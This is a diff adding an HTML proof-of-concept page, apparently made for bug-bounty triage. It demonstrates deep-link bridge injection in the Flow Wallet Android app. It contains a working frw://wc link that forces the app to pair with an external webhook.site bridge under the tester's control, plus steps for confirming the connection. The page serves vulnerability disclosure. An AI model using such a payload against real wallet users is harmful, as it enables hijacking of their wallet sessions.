@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC - Flow Wallet Deep Link Vulnerability</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            padding: 40px; 
+            line-height: 1.6;
+            background-color: #f4f4f9;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        h1 { color: #333; }
+        .warning-box {
+            background-color: #fff3cd;
+            border-left: 5px solid #ffecb5;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #856404;
+            font-size: 0.9em;
+        }
+        .btn { 
+            background: #00ef8b; 
+            color: #004a2b; 
+            padding: 18px 30px; 
+            text-decoration: none; 
+            border-radius: 10px; 
+            font-weight: bold; 
+            display: inline-block;
+            font-size: 1.1em;
+            transition: transform 0.2s;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .btn:active { transform: scale(0.95); }
+        code { background: #eee; padding: 2px 5px; border-radius: 4px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Security Research PoC</h1>
+    <div class="warning-box">
+        <strong>Target:</strong> Flow Wallet (Android) <br>
+        <strong>Vulnerability:</strong> Improper Input Validation (Deep Link Bridge Injection)
+    </div>
+    
+    <p>This page demonstrates how a malicious website can force <b>Flow Wallet</b> to connect to an external, attacker-controlled bridge server.</p>
+    
+    <p>By clicking below, the app will attempt a pairing handshake with: <br>
+    <code>webhook.site/8cc82713...</code></p>
+    
+    <a href="frw://wc?uri=wc:attack-demo-session@2?bridge=https%3A%2F%2Fwebhook.site%2F8cc82713-ca57-48e5-9e59-27a35549eabe&key=poc-secret-key" class="btn">
+      TRIGGER MALICIOUS PAIRING
+    </a>
+
+    <hr style="margin-top: 40px; border: 0; border-top: 1px solid #eee;">
+    <p style="font-size: 0.8em; color: #888;">
+        Instructions for Triage: <br>
+        1. Open this page in Chrome on Android. <br>
+        2. Ensure Flow Wallet is installed. <br>
+        3. Click the button and observe the app opening. <br>
+        4. Check the Webhook.site logs for the incoming connection request.
+    </p>
+</div>
+
+</body>
+</html>
